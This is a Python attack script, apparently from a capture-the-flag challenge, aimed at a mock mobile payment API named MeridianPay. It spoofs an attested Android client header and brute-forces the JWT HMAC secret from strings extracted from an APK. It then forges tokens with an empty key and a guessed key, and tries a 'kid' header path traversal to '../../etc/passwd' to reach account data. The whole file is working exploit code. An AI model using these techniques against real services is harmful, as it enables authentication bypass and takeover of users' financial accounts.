import base64, hmac, hashlib, json, itertools, re, urllib.request, urllib.error, ssl, sys

BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
CL = "MeridianPay-Android/3.2.1 (attested)"

def raw(p, m="GET", b=None, tok=None, cl=CL):
    h = {"Content-Type":"application/json"}
    if cl: h["X-Meridian-Client"] = cl
    if tok: h["Authorization"] = "Bearer " + tok
    d = json.dumps(b).encode() if b is not None else None
    r = urllib.request.Request(BASE+p, data=d, method=m, headers=h)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=8) as f: return f.status, f.read().decode()
    except urllib.error.HTTPError as e: return e.code, e.read().decode()
    except Exception as e: return None, repr(e)

def b64u(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()

def make(payload, secret):
    h = b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')).encode())
    p = b64u(json.dumps(payload,separators=(',',':')).encode())
    s = hmac.new(secret.encode(), (h+"."+p).encode(), hashlib.sha256).digest()
    return h+"."+p+"."+b64u(s)

_, t = raw("/api/v1/auth/device","POST",{"device_id":"jwtforged"})
real = json.loads(t)["token"]
h0,p0,s0 = real.split(".")
sig = base64.urlsafe_b64decode(s0+"="*(-len(s0)%4))
signing = (h0+"."+p0).encode()

# candidate pool: every printable string in the dex/manifest/arsc + theme words + transforms
pool = set()
for fn in ["apk/classes.dex","apk/AndroidManifest.xml","apk/resources.arsc","apk/res/layout/activity_main.xml"]:
    d = open(fn,"rb").read()
    for m in re.findall(rb"[\x20-\x7e]{3,}", d):
        pool.add(m.decode())
pool |= {"meridian","meridianpay","MeridianPay","meridian-pay","Meridian Pay","pay","secret","changeme",
         "password","admin","key","jwt","hs256","test","dev","production","meridianpaysecret",
         "meridian_pay","meridianpay321","3.2.1","attested","attestation","trust","trustme","trust-me",
         "everyone","neobank","bank","mobile","android","receipt","device","session","token"}
gens = set(pool)
for w in pool:
    lw = w.lower().replace(" ","").replace("/","").replace("(","").replace(")","")
    gens |= {lw, lw.capitalize(), lw.upper(), w.lower(), w+"secret", "secret"+w.lower(),
             lw+"secret", "secret"+lw, lw+"key", "key"+lw, lw+"2026", lw+"2025", lw+"!", lw+"123",
             lw.replace("-","_"), lw.replace("_","-"), w, "h7ctf"+lw, lw+"h7ctf"}
short = [g for g in gens if len(g) <= 40]
print("candidates:", len(short))
hit = None
for g in short:
    if hmac.compare_digest(hmac.new(g.encode(), signing, hashlib.sha256).digest(), sig):
        hit = g; break
print("SECRET:", hit)
if hit:
    json.dump({"secret":hit}, open("jwt_secret.json","w"))
    sys.exit(0)

# online battery: does the server accept empty/other-key signatures or weird alg?
tests = {}
tests["empty-key"] = make({"sub":"1000","iat":1790405077,"exp":1790491477}, "")
tests["HS256-sub1000-knownsecret"] = make({"sub":"1000","iat":1790405077,"exp":1790491477}, "secret")
for k,v in tests.items():
    print(k, raw("/api/v1/accounts/me", tok=v)[1][:120])
# header tricks
h = b64u(json.dumps({"alg":"HS256","typ":"JWT","kid":"../../etc/passwd"},separators=(',',':')).encode())
p = b64u(json.dumps({"sub":"1000","iat":1790405077,"exp":1790491477},separators=(',',':')).encode())
s = b64u(hmac.new(b"", (h+"."+p).encode(), hashlib.sha256).digest())
print("kid-empty", raw("/api/v1/accounts/me", tok=h+"."+p+"."+s)[1][:120])
